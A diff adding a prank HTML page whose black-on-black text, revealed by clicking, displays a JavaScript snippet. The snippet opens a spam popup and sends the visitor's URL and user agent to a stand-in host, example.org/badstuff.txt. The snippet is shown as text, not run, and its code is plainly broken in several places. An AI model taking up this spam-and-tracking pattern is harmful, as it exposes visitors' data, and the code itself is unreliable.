@@ -1,0 +1,43 @@
+<!-- ████ ██ ████ ████████ ████.-->
+<!DOCTYPE html>
+	<html>
+		<head>
+			<meta name="viewport" content="content-width=device-width,initial-scale=1.0" />
+		</head>
+		<p onclick="this.style.backgroundColor='white';" style="background-color:black;">
+			How did you get here? You <strong>must</strong> have clicked on the text!
+			<pre onclick="this.style.backgroundColor='white';" style="background-color:black;">(function(somespam) {
+	var mywindow=window.open('','SOMESPAM','400x600');
+	mywindow.document.write("&lt;!DOCTYPE html&gt;")
+	mywindow.document.write(somespam);
+	setTimeout(5000, function() {
+		mywindow.document.write("Ready to buy? Go to example.org!");
+	});
+	setTimeout(1,function() {
+		var myobj={
+			"content"=location.href;
+			"useragent"=navigator.userAgent;
+		};
+		import fs from fs;
+		fs.writeFile('http://example.org/badstuff.txt', myobj, function (err,data) {
+		  if (err) {
+			return console.log(err);
+		  }
+		  console.log(data);
+		});
+	});
+	mywindow.focus();
+	mywindow.document.close();
+})("BUY NOW!!!");</pre>
+		</p>
+		<style>
+		* {
+			user-select:none;
+			-o-user-select:none;
+			-ms-user-select:none;
+			-moz-user-select:none;
+			-webkit-user-select:none;
+		}
+		</style>
+	</html>
+<!-- This is some censored text.-->
